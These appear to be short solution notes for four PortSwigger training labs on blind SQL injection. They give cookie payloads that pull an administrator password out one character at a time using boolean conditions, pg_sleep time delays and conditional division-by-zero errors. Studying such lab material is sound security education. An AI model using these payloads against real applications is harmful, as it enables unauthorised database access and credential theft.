## [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
Exploiting hard coded cookie in database
```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
```

This payload works in the Cookie header

## [Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
classic time delay
```sql
TrackingId=x'||pg_sleep(10)--
```
## [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

This payload works in the Cookie header

##   [Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

```sql
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

If this: FROM users WHERE username='administrator'. is true
It will execute this: SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0)

For every 500 request, we know that that is the password's character. Otherrwise an empty string